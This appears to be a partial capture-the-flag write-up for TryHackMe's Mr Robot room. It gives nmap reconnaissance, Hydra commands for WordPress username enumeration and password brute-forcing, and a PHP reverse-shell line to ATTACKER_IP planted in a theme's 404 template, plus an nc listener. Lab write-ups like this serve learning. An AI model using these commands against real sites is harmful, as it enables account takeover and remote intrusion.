# Mr Robot CTF — TryHackMe

**Difficulty:** Medium  
**Platform:** TryHackMe  
**Status:** In Progress (1/3 keys found)

---

## Reconnaissance

Nmap scan to find open ports.

```bash
nmap -sV 10.128.189.118
```

Results:
- Port 22 — SSH
- Port 80 — HTTP (Apache)
- Port 443 — HTTPS (Apache)

Linux machine with a web server. We go for the website.

---

## Key 1 — robots.txt

First reflex on any web target — check robots.txt.
http://TARGET_IP/robots.txt

Found two hidden files: `fsocity.dic` and `key-1-of-3.txt`

**Key 1 found.**

---

## Username Enumeration — Hydra

Site runs WordPress. WordPress tells you if a username exists or not — information leak we can exploit.

Downloaded the wordlist from the target then removed duplicates:

```bash
wget http://TARGET_IP/fsocity.dic
sort -u fsocity.dic -o fsocity.dic
hydra -L fsocity.dic -p test TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username"
```

**Username found:** Elliot

---

## Password Crack — Hydra

```bash
hydra -l Elliot -P fsocity.dic TARGET_IP http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:The password you entered"
```

**Password found:** ER28-0652

---

## Reverse Shell — WordPress Theme Editor

Logged in as Elliot. Injected a reverse shell into the 404 template via Appearance → Theme Editor.

```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

Listener on AttackBox:
```bash
nc -lvnp 4444
```

Triggered by visiting the 404.php file. Shell obtained.

---

## To Be Continued

Keys 2 and 3 — privilege escalation. Resuming next session.
